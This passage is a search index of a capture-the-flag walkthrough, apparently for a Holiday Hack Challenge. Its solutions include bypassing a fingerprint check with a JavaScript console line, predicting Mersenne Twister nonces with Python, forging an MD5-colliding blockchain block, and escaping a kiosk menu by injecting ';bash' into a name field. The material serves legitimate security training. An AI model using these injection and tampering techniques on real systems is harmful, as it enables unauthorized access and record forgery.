how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. Approved: Mother Nature Superman Clarice Yukon Cornelius Ginger Breaddie King Moonracer Mrs. Donner Charlie In the Box Krampus Dolly Snow Miser Alabaster Snowball Queen of the Winter Spirits Opposed: Jack Frost Resolution carries. Construction approved. NEW BUSINESS: Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc. Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time\u2019s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers \u201cincredibly high for a building that size, likely two orders of magnitude too high. Why, it might burn the whole North Pole down!\u201d Mr. H. Miser replied with a laugh, \u201cThat\u2019s the whole point!\u201d The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time\u2019s castle heating system. Motion to adjourn \u2013 So moved, Krampus. Second \u2013 Clarice. All in favor \u2013 aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan. Meeting adjourned. Answer: Tanta Kringle","title":"Solution"},{"location":"Objectives/obj-10.html","text":"Objective #10 - Defeat Fingerprint Sensor Objective Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint. Solution Step 1: Inspect the javascript source using the browser developer tools, or download it from https://elevator.kringlecastle.com/app.js. You\u2019ll find that the code behind the fingerprint sensor checks to see if the user has the value \u201cbesanta\u201d in the token array. Step 2: Search for any references to \u201ctokens\u201d in the source to determine how you might manipulate the program's behavior. Step 3: Type tokens.push(\u2018besanta\u2019) into the javascript console. You can now bypass the fingerprint reader and visit Santa\u2019s office without being Santa.","title":"10) Defeat Fingerprint Sensor"},{"location":"Objectives/obj-10.html#objective-10-defeat-fingerprint-sensor","text":"","title":"Objective #10 - Defeat Fingerprint Sensor"},{"location":"Objectives/obj-10.html#objective","text":"Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.","title":"Objective"},{"location":"Objectives/obj-10.html#solution","text":"Step 1: Inspect the javascript source using the browser developer tools, or download it from https://elevator.kringlecastle.com/app.js. You\u2019ll find that the code behind the fingerprint sensor checks to see if the user has the value \u201cbesanta\u201d in the token array. Step 2: Search for any references to \u201ctokens\u201d in the source to determine how you might manipulate the program's behavior. Step 3: Type tokens.push(\u2018besanta\u2019) into the javascript console. You can now bypass the fingerprint reader and visit Santa\u2019s office without being Santa.","title":"Solution"},{"location":"Objectives/obj-11a.html","text":"Objective 11a - Naughty/Nice List with Blockchain Investigation Part 1 Objective Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce) Analysis In this and the next objectives, you're going to explore and manipulate the blockchain that Santa uses to track his naughty and nice list. Tip Watch Professor Qwerty Petabyte's talk Working with the Official Naughty/Nice Blockchain for some important background on this topic. Tip Read about the Snowball Fight terminal , as it lays the foundation for completing this task. Solution Step 1: Download the following items: The zip file provided in the objective; inside are some helpful tools and documentation. The blockchain.dat file on Santa's desk. The file mt19937predictor.py from kmyk's mersenne-twister-predictor Github repository. Unpack the tools zip file and copy blockchain.dat and mt19937predictor.py to the same directory. Step 2: Create a program that extracts the last 624 nonces from the blockchain.dat file, loads them into the predictor's MT array, and then predicts the next several nonces. Use naughty_nice.py as a module, as it contains pre-built functions to read blocks and the data inside them. Note The Mersenne-Twister predictor I've chosen to use for this example is able to create 64-bit random numbers, which is necessary for the nonce values found in Santa's blockchain. #!/usr/bin/env python3 # Requires mt19937predictor.py from # https://github.com/kmyk/mersenne-twister-predictor import naughty_nice import random from mt19937predictor import MT19937Predictor predictor = MT19937Predictor () # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) print ( \"Number of blocks in chain: %i \" % ( len ( c2 . blocks ))) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Select the blocks to load nonces from interesting_blocks = c2 . blocks [ - 624 :] # Load nonces into Mersenne-Twister array for i in range ( len ( interesting_blocks )): predictor . setrandbits ( interesting_blocks [ i ] . nonce , 64 ) print ( \" %i : Set nonce value %i ( %16.16x )\" % ( interesting_blocks [ i ] . index , interesting_blocks [ i ] . nonce , interesting_blocks [ i ] . nonce )) index = interesting_blocks [ i ] . index # Print the next 5 predicted nonces for i in range ( 5 ): x = predictor . getrandbits ( 64 ) print ( \" %i : Predict nonce value %i ( %16.16x )\" % ( index + i + 1 , x , x )) Step 3: Run the program and use the nonce predicted for block 130000 to answer the objective. $ ./obj-11a.py 129997: Predict nonce value 13205885317093879758 (b744baba65ed6fce) 129998: Predict nonce value 109892600914328301 (01866abd00f13aed) 129999: Predict nonce value 9533956617156166628 (844f6b07bd9403e4) 130000: Predict nonce value 6270808489970332317 (57066318f32f729d) 130001: Predict nonce value 3451226212373906987 (2fe537f46c10462b) Answer: 57066318f32f729d","title":"11a) Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"Objectives/obj-11a.html#objective-11a-naughtynice-list-with-blockchain-investigation-part-1","text":"","title":"Objective 11a - Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"Objectives/obj-11a.html#objective","text":"Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)","title":"Objective"},{"location":"Objectives/obj-11a.html#analysis","text":"In this and the next objectives, you're going to explore and manipulate the blockchain that Santa uses to track his naughty and nice list. Tip Watch Professor Qwerty Petabyte's talk Working with the Official Naughty/Nice Blockchain for some important background on this topic. Tip Read about the Snowball Fight terminal , as it lays the foundation for completing this task.","title":"Analysis"},{"location":"Objectives/obj-11a.html#solution","text":"Step 1: Download the following items: The zip file provided in the objective; inside are some helpful tools and documentation. The blockchain.dat file on Santa's desk. The file mt19937predictor.py from kmyk's mersenne-twister-predictor Github repository. Unpack the tools zip file and copy blockchain.dat and mt19937predictor.py to the same directory. Step 2: Create a program that extracts the last 624 nonces from the blockchain.dat file, loads them into the predictor's MT array, and then predicts the next several nonces. Use naughty_nice.py as a module, as it contains pre-built functions to read blocks and the data inside them. Note The Mersenne-Twister predictor I've chosen to use for this example is able to create 64-bit random numbers, which is necessary for the nonce values found in Santa's blockchain. #!/usr/bin/env python3 # Requires mt19937predictor.py from # https://github.com/kmyk/mersenne-twister-predictor import naughty_nice import random from mt19937predictor import MT19937Predictor predictor = MT19937Predictor () # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) print ( \"Number of blocks in chain: %i \" % ( len ( c2 . blocks ))) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Select the blocks to load nonces from interesting_blocks = c2 . blocks [ - 624 :] # Load nonces into Mersenne-Twister array for i in range ( len ( interesting_blocks )): predictor . setrandbits ( interesting_blocks [ i ] . nonce , 64 ) print ( \" %i : Set nonce value %i ( %16.16x )\" % ( interesting_blocks [ i ] . index , interesting_blocks [ i ] . nonce , interesting_blocks [ i ] . nonce )) index = interesting_blocks [ i ] . index # Print the next 5 predicted nonces for i in range ( 5 ): x = predictor . getrandbits ( 64 ) print ( \" %i : Predict nonce value %i ( %16.16x )\" % ( index + i + 1 , x , x )) Step 3: Run the program and use the nonce predicted for block 130000 to answer the objective. $ ./obj-11a.py 129997: Predict nonce value 13205885317093879758 (b744baba65ed6fce) 129998: Predict nonce value 109892600914328301 (01866abd00f13aed) 129999: Predict nonce value 9533956617156166628 (844f6b07bd9403e4) 130000: Predict nonce value 6270808489970332317 (57066318f32f729d) 130001: Predict nonce value 3451226212373906987 (2fe537f46c10462b) Answer: 57066318f32f729d","title":"Solution"},{"location":"Objectives/obj-11b.html","text":"Objective 11b - Naughty/Nice List with Blockchain Investigation Part 2 Objective The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Tip Watch Professor Qwerty Petabyte's talk Working with the Official Naughty/Nice Blockchain for some important background on this topic. Tip Read the slide deck on Hash Collision Exploitation suggested by Tangle Coalbox. Analysis It's helpful to get comfortable using the blockchain.dat file and naughty_nice.py. Explore the functions and write some test code. One thing you can do is dump out all the documents stored in the blockchain. Some of the elf reports in these files are hilarious. You'll find that one block (#129459) has more than one file attached. The first is a PDF, and the other is an unrecognizable binary file. Take a closer look at the block and its contents. #!/usr/bin/env python3 import naughty_nice import os if __name__ == '__main__' : # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Dump out all of the files for i in range ( len ( c2 . blocks )): for j in range ( c2 . blocks [ i ] . doc_count ): orig_filename = ' %s . %s ' % ( str ( c2 . blocks [ i ] . index ), naughty_nice . data_extension [ c2 . blocks [ i ] . data [ j - 1 ][ 'type' ]]) new_filename = ' %s - %i . %s ' % ( str ( c2 . blocks [ i ] . index ), j , naughty_nice . data_extension [ c2 . blocks [ i ] . data [ j - 1 ][ 'type' ]]) c2 . blocks [ i ] . dump_doc ( j ) os . rename ( orig_filename , r 'docs/' + new_filename ) The block itself shows that Jack Frost received the highest nice score possible, and the PDF contains a very complimentary report by Shinny Upatree. Shinny denies writing this, but the unbroken blockchain would seem to contradict that. Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Slide 194 in the aforementioned slidedeck talks about a way to create a PDF with an MD5 hash collision. The technique relies on the fact that a PDF file is composed of multiple sections that are mapped by something like a table of contents. You can leave certain pages out of the mapping, and while the data is still in the file, it will be unused by the reader. 129459-0.pdf - A glowing review of Jack Frost stored in the blockchain You can modify that map using a hex editor, restoring the original text from the text Jack Frost injected into the file. The first few lines of the PDF files read as follows: $ strings 129459-0.pdf %PDF-1.3 1 0 obj <</Type/Catalog/_Go_Away/Santa/Pages 2 0 R 0 Use a hex editor to change \"Pages 2 0 R\" to \"Pages 3 0 R\" and then view the PDF again. 129459-0.pdf - After having the original text restored This time, Jack Frost's true nature is revealed. Jack used a UniColl technique (described here: https://github.com/corkami/collisions#pdf ) to create the alternate PDF file without altering the MD5 hash. In fact, a ready-made script is available that claims to do this in mere seconds. In addition to changing the PDF file, Jack also flipped the sign from naughty to nice in the block without altering its MD5 hash. This was done using the same technique, made possible because the file attachment data is stored in the block immediately after the 64-bytes containing the naughty/nice value. Examining the block_data() function in naughty_nice.py, you can determine the data structure. The first 64-bytes are made up of the block's index number, nonce value, pid, and rid. The next 64-bytes begin with: doc_count (c), score, sign (s), file attachment type, file attachment data length, and then the data for the file itself. Block file structure This block has another file attached besides the PDF. That second file is stored beginning in the first data field. Jack Frost used that binary blob to create an MD5 hash collision for the changed naughty/nice sign. Your job now is to restore the sign back to naughty (0) and the original text in the PDF file. The objective says you can do this with changes to only 4 bytes in the block. Solution Step 1: Create a program to output the block to a file. #!/usr/bin/env python3 import naughty_nice if __name__ == \"__main__\" : # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Show the block details print ( \"C2: Block data: %s \" % ( c2 . blocks [ 129459 - c2 . blocks [ 0 ] . index ])) # Dump the block to a file c2 . save_a_block ( 129459 - c2 . blocks [ 0 ] . index , \"block.dat\" ) Step 2: Run the program and check its hashes to ensure you got what you were expecting. The objective stated that the sha256 hash would begin with 58a3b933; the matching file hash confirms the program ran properly. $ ./obj-11b.py $ sha256sum block.dat 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f $ md5sum block.dat b10b4a6bd373b61f32f4fd3a0cdfbf84 Step 3: Open the dat file in a hex editor and modify some bytes. Earlier you changed one byte in the pdf file to restore its original content, however that altered the file\u2019s MD5 hash. Apply the UniColl technique, updating adjacent bytes in the next 64-byte block. Since you made a +1 change in the PDF file, make -1 change in the next block to negate the change to the MD5 hash. Repeat the technique to fix the sign value. This time you made a -1 change to the sign, so make a +1 change in the next 64-byte block. Hex editor view (after changes were made) Note I used hexedit with the -l 16 option so that the bytes would be aligned nicely in the terminal, and each 4 lines represents a 64-byte block. The default behavior is to display as many bytes across the screen that will fit, which could be harder to read depending on your terminal width. Step 4: Verify the hashes. You can see that the md5 hash of the original block.dat file and the modified block.mod file match, but the sha256 hash is different. $ md5sum block.dat b10b4a6bd373b61f32f4fd3a0cdfbf84 $ md5sum block.mod b10b4a6bd373b61f32f4fd3a0cdfbf84 $ sha256sum block.dat 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f $ sha256sum block.mod fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"11b) Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"Objectives/obj-11b.html#objective-11b-naughtynice-list-with-blockchain-investigation-part-2","text":"","title":"Objective 11b - Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"Objectives/obj-11b.html#objective","text":"The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Tip Watch Professor Qwerty Petabyte's talk Working with the Official Naughty/Nice Blockchain for some important background on this topic. Tip Read the slide deck on Hash Collision Exploitation suggested by Tangle Coalbox.","title":"Objective"},{"location":"Objectives/obj-11b.html#analysis","text":"It's helpful to get comfortable using the blockchain.dat file and naughty_nice.py. Explore the functions and write some test code. One thing you can do is dump out all the documents stored in the blockchain. Some of the elf reports in these files are hilarious. You'll find that one block (#129459) has more than one file attached. The first is a PDF, and the other is an unrecognizable binary file. Take a closer look at the block and its contents. #!/usr/bin/env python3 import naughty_nice import os if __name__ == '__main__' : # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Dump out all of the files for i in range ( len ( c2 . blocks )): for j in range ( c2 . blocks [ i ] . doc_count ): orig_filename = ' %s . %s ' % ( str ( c2 . blocks [ i ] . index ), naughty_nice . data_extension [ c2 . blocks [ i ] . data [ j - 1 ][ 'type' ]]) new_filename = ' %s - %i . %s ' % ( str ( c2 . blocks [ i ] . index ), j , naughty_nice . data_extension [ c2 . blocks [ i ] . data [ j - 1 ][ 'type' ]]) c2 . blocks [ i ] . dump_doc ( j ) os . rename ( orig_filename , r 'docs/' + new_filename ) The block itself shows that Jack Frost received the highest nice score possible, and the PDF contains a very complimentary report by Shinny Upatree. Shinny denies writing this, but the unbroken blockchain would seem to contradict that. Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Slide 194 in the aforementioned slidedeck talks about a way to create a PDF with an MD5 hash collision. The technique relies on the fact that a PDF file is composed of multiple sections that are mapped by something like a table of contents. You can leave certain pages out of the mapping, and while the data is still in the file, it will be unused by the reader. 129459-0.pdf - A glowing review of Jack Frost stored in the blockchain You can modify that map using a hex editor, restoring the original text from the text Jack Frost injected into the file. The first few lines of the PDF files read as follows: $ strings 129459-0.pdf %PDF-1.3 1 0 obj <</Type/Catalog/_Go_Away/Santa/Pages 2 0 R 0 Use a hex editor to change \"Pages 2 0 R\" to \"Pages 3 0 R\" and then view the PDF again. 129459-0.pdf - After having the original text restored This time, Jack Frost's true nature is revealed. Jack used a UniColl technique (described here: https://github.com/corkami/collisions#pdf ) to create the alternate PDF file without altering the MD5 hash. In fact, a ready-made script is available that claims to do this in mere seconds. In addition to changing the PDF file, Jack also flipped the sign from naughty to nice in the block without altering its MD5 hash. This was done using the same technique, made possible because the file attachment data is stored in the block immediately after the 64-bytes containing the naughty/nice value. Examining the block_data() function in naughty_nice.py, you can determine the data structure. The first 64-bytes are made up of the block's index number, nonce value, pid, and rid. The next 64-bytes begin with: doc_count (c), score, sign (s), file attachment type, file attachment data length, and then the data for the file itself. Block file structure This block has another file attached besides the PDF. That second file is stored beginning in the first data field. Jack Frost used that binary blob to create an MD5 hash collision for the changed naughty/nice sign. Your job now is to restore the sign back to naughty (0) and the original text in the PDF file. The objective says you can do this with changes to only 4 bytes in the block.","title":"Analysis"},{"location":"Objectives/obj-11b.html#solution","text":"Step 1: Create a program to output the block to a file. #!/usr/bin/env python3 import naughty_nice if __name__ == \"__main__\" : # Import the official public key with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = naughty_nice . RSA . importKey ( fh . read ()) # Read the blockchain data into c2 c2 = naughty_nice . Chain ( load = True , filename = 'blockchain.dat' ) # Verify the blockchain data print ( \"C2: Block chain verify: %s \" % ( c2 . verify_chain ( official_public_key , c2 . blocks [ 0 ] . previous_hash ))) # Show the block details print ( \"C2: Block data: %s \" % ( c2 . blocks [ 129459 - c2 . blocks [ 0 ] . index ])) # Dump the block to a file c2 . save_a_block ( 129459 - c2 . blocks [ 0 ] . index , \"block.dat\" ) Step 2: Run the program and check its hashes to ensure you got what you were expecting. The objective stated that the sha256 hash would begin with 58a3b933; the matching file hash confirms the program ran properly. $ ./obj-11b.py $ sha256sum block.dat 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f $ md5sum block.dat b10b4a6bd373b61f32f4fd3a0cdfbf84 Step 3: Open the dat file in a hex editor and modify some bytes. Earlier you changed one byte in the pdf file to restore its original content, however that altered the file\u2019s MD5 hash. Apply the UniColl technique, updating adjacent bytes in the next 64-byte block. Since you made a +1 change in the PDF file, make -1 change in the next block to negate the change to the MD5 hash. Repeat the technique to fix the sign value. This time you made a -1 change to the sign, so make a +1 change in the next 64-byte block. Hex editor view (after changes were made) Note I used hexedit with the -l 16 option so that the bytes would be aligned nicely in the terminal, and each 4 lines represents a 64-byte block. The default behavior is to display as many bytes across the screen that will fit, which could be harder to read depending on your terminal width. Step 4: Verify the hashes. You can see that the md5 hash of the original block.dat file and the modified block.mod file match, but the sha256 hash is different. $ md5sum block.dat b10b4a6bd373b61f32f4fd3a0cdfbf84 $ md5sum block.mod b10b4a6bd373b61f32f4fd3a0cdfbf84 $ sha256sum block.dat 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f $ sha256sum block.mod fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Solution"},{"location":"Terminals/336kbps.html","text":"33.6kbps Objective This game has you playing the role of a modem negotiating a connection. This is a conversation between two devices, so you'll play your sounds in response to the other side's sounds. Solution Step 1: Pick up the handset and dial 756-8347. Step 2: Play the following sounds in order: baaDEEbrrr, aaah, WEWEwwrwrrwrr, beDURRdunditty, SCHHRRHHRTHRTR. Info What did you just say?? Want to know what each of those tones means? Watch this video for a detailed explanation: https://www.youtube.com/watch?v=abapFJN6glo .","title":"33.6kbps"},{"location":"Terminals/336kbps.html#336kbps","text":"","title":"33.6kbps"},{"location":"Terminals/336kbps.html#objective","text":"This game has you playing the role of a modem negotiating a connection. This is a conversation between two devices, so you'll play your sounds in response to the other side's sounds.","title":"Objective"},{"location":"Terminals/336kbps.html#solution","text":"Step 1: Pick up the handset and dial 756-8347. Step 2: Play the following sounds in order: baaDEEbrrr, aaah, WEWEwwrwrrwrr, beDURRdunditty, SCHHRRHHRTHRTR. Info What did you just say?? Want to know what each of those tones means? Watch this video for a detailed explanation: https://www.youtube.com/watch?v=abapFJN6glo .","title":"Solution"},{"location":"Terminals/canbus.html","text":"CAN-Bus Investigation Objective Solution Step 1: When you first open the candump.log file you\u2019ll notice there are a lot of event ID 244 and 188 messages. If you filter these out, you\u2019ll find three remaining messages. Two are the lock signals the terminal challenge tells you you\u2019ll find, and the other must be the unlock signal. elf@3ee86141f23b:~$ cat candump.log | egrep -v \"(244|188)\" (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 Step 2: Provide the timestamp to the ./runtoanswer program. elf@3ee86141f23b:~$ ./runtoanswer 122520 Your answer: 122520 Checking.... Your answer is correct!","title":"CAN-Bus Investigation"},{"location":"Terminals/canbus.html#can-bus-investigation","text":"","title":"CAN-Bus Investigation"},{"location":"Terminals/canbus.html#objective","text":"","title":"Objective"},{"location":"Terminals/canbus.html#solution","text":"Step 1: When you first open the candump.log file you\u2019ll notice there are a lot of event ID 244 and 188 messages. If you filter these out, you\u2019ll find three remaining messages. Two are the lock signals the terminal challenge tells you you\u2019ll find, and the other must be the unlock signal. elf@3ee86141f23b:~$ cat candump.log | egrep -v \"(244|188)\" (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 Step 2: Provide the timestamp to the ./runtoanswer program. elf@3ee86141f23b:~$ ./runtoanswer 122520 Your answer: 122520 Checking.... Your answer is correct!","title":"Solution"},{"location":"Terminals/elfcode.html","text":"The Elf Code Objective Instead of using traditional game controls, write javascript code to move the character around the game map, collect items, and interact with non-player characters. Solution Level 1 - Program the elf to the end goal in no more than 2 lines of code and no more than 2 elf commands. elf.moveLeft(10) elf.moveUp(10) Level 2 - Program the elf to the end goal in no more than 5 lines of code and no more than 5 elf command/function execution statements in your code. elf.moveLeft(6) var sum = elf.get_lever(0) + 2 elf.pull_lever(sum) elf.moveLeft(4) elf.moveUp(10) Level 3 - Pick up all the lollipops. Program the elf to the end goal in no more than 4 lines of code and no more than 4 elf command/function execution statements in your code. elf.moveTo(lollipop[0]) elf.moveTo(lollipop[1]) elf.moveTo(lollipop[2]) elf.moveUp(1) Level 4 - Program the elf to the end goal in no more than 7 lines of code and no more than 6 elf command/function execution statements in your code. for (var i = 0; i < 5; i++) { elf.moveLeft(3) elf.moveUp(11) elf.moveLeft(3) elf.moveDown(11) } Level 5 - Program the elf to the end goal in no more than 10 lines of code and no more than 5 elf command/function execution statements in your code.. elf.moveTo(munchkin[0]) var array = elf.ask_munch(0) var answer = [] array.forEach(function(item) { if (typeof item === 'number') { answer.push(item) } }); elf.tell_munch(answer) elf.moveUp(2) Level 6 - Program the elf to the end goal in no more than 15 lines of code and no more than 7 elf command/function execution statements in your code. for (var i = 0; i < 4; i++) { elf.moveTo(lollipop[i]) } elf.moveTo(lever[0]) var list = elf.get_lever(0) list.unshift(\"munchkins rule\") elf.pull_lever(list) elf.moveDown(3) elf.moveLeft(6) elf.moveUp(10) Level 7 (Bonus Level) - Program the elf to the end goal in no more than 25 lines of code and no more than 10 elf command/function execution statements in your code. function YourFunctionNameHere(arrays) { var sum = 0 arrays.forEach(function(array) { array.forEach(function(value) { if( typeof(value) == 'number') { sum += value } }); }); return sum } var directions = [elf.moveDown, elf.moveLeft, elf.moveUp, elf.moveRight, elf.moveDown, elf.moveLeft, elf.moveUp, elf.moveRight] for (var i = 0; i < 7; i++) { directions[i](i + 1) elf.pull_lever(i) } elf.moveRight(8) elf.moveUp(2) elf.moveLeft(4) answer = elf.ask_munch(0) elf.tell_munch(YourFunctionNameHere) elf.moveUp(1) Level 8 (Bonus Level) - Program the elf to the end goal in no more than 40 lines of code and no more than 10 elf command/function execution statements in your code. function YourFunctionNameHere(a) { for ( var x=0; x < a.length; x++ ) { b = a[x] c = Object.keys(b).find(key => b[key] == 'lollipop') if (typeof(c) == 'string') { return c break } } } var hohoho = 0 for (var i = 0; i < 6; i++) { if (i % 2 == 0) { elf.moveRight((i * 2) + 1) } else { elf.moveLeft((i * 2) + 1) } hohoho += elf.get_lever(i) elf.pull_lever(hohoho) elf.moveUp(2) } elf.tell_munch(YourFunctionNameHere) elf.moveRight(11)","title":"The Elf Code"},{"location":"Terminals/elfcode.html#the-elf-code","text":"","title":"The Elf Code"},{"location":"Terminals/elfcode.html#objective","text":"Instead of using traditional game controls, write javascript code to move the character around the game map, collect items, and interact with non-player characters.","title":"Objective"},{"location":"Terminals/elfcode.html#solution","text":"Level 1 - Program the elf to the end goal in no more than 2 lines of code and no more than 2 elf commands. elf.moveLeft(10) elf.moveUp(10) Level 2 - Program the elf to the end goal in no more than 5 lines of code and no more than 5 elf command/function execution statements in your code. elf.moveLeft(6) var sum = elf.get_lever(0) + 2 elf.pull_lever(sum) elf.moveLeft(4) elf.moveUp(10) Level 3 - Pick up all the lollipops. Program the elf to the end goal in no more than 4 lines of code and no more than 4 elf command/function execution statements in your code. elf.moveTo(lollipop[0]) elf.moveTo(lollipop[1]) elf.moveTo(lollipop[2]) elf.moveUp(1) Level 4 - Program the elf to the end goal in no more than 7 lines of code and no more than 6 elf command/function execution statements in your code. for (var i = 0; i < 5; i++) { elf.moveLeft(3) elf.moveUp(11) elf.moveLeft(3) elf.moveDown(11) } Level 5 - Program the elf to the end goal in no more than 10 lines of code and no more than 5 elf command/function execution statements in your code.. elf.moveTo(munchkin[0]) var array = elf.ask_munch(0) var answer = [] array.forEach(function(item) { if (typeof item === 'number') { answer.push(item) } }); elf.tell_munch(answer) elf.moveUp(2) Level 6 - Program the elf to the end goal in no more than 15 lines of code and no more than 7 elf command/function execution statements in your code. for (var i = 0; i < 4; i++) { elf.moveTo(lollipop[i]) } elf.moveTo(lever[0]) var list = elf.get_lever(0) list.unshift(\"munchkins rule\") elf.pull_lever(list) elf.moveDown(3) elf.moveLeft(6) elf.moveUp(10) Level 7 (Bonus Level) - Program the elf to the end goal in no more than 25 lines of code and no more than 10 elf command/function execution statements in your code. function YourFunctionNameHere(arrays) { var sum = 0 arrays.forEach(function(array) { array.forEach(function(value) { if( typeof(value) == 'number') { sum += value } }); }); return sum } var directions = [elf.moveDown, elf.moveLeft, elf.moveUp, elf.moveRight, elf.moveDown, elf.moveLeft, elf.moveUp, elf.moveRight] for (var i = 0; i < 7; i++) { directions[i](i + 1) elf.pull_lever(i) } elf.moveRight(8) elf.moveUp(2) elf.moveLeft(4) answer = elf.ask_munch(0) elf.tell_munch(YourFunctionNameHere) elf.moveUp(1) Level 8 (Bonus Level) - Program the elf to the end goal in no more than 40 lines of code and no more than 10 elf command/function execution statements in your code. function YourFunctionNameHere(a) { for ( var x=0; x < a.length; x++ ) { b = a[x] c = Object.keys(b).find(key => b[key] == 'lollipop') if (typeof(c) == 'string') { return c break } } } var hohoho = 0 for (var i = 0; i < 6; i++) { if (i % 2 == 0) { elf.moveRight((i * 2) + 1) } else { elf.moveLeft((i * 2) + 1) } hohoho += elf.get_lever(i) elf.pull_lever(hohoho) elf.moveUp(2) } elf.tell_munch(YourFunctionNameHere) elf.moveRight(11)","title":"Solution"},{"location":"Terminals/kiosk.html","text":"Kringle Kiosk Objective Explore the options on the menu to obtain a map of Santa's Castle, the rules of engagement for this Holiday Hack Challenge, and a listing of where to find each elf. To exploit the app and complete this terminal, you'll have to escape the menu to a bash shell. Analysis When you select option 4 to create your badge, it takes your name as user input and runs a Christmas-themed version of cowsay. Since cowsay is a command line program, you might be able to perform a command injection to start the bash shell. In a *nix shell, you can run two or more separate commands per line by separating them with semicolons. Solution Step 1: Select option 4 from the menu Step 2: Enter your name followed by \";bash\"","title":"Kringle Kiosk"},{"location":"Terminals/kiosk.html#kringle-kiosk","text":"","title":"Kringle Kiosk"},{"location":"Terminals/kiosk.html#objective","text":"Explore the options on the menu to obtain a map of Santa's Castle, the rules of engagement for this Holiday Hack Challenge, and a listing of where to find each elf. To exploit the app and complete this 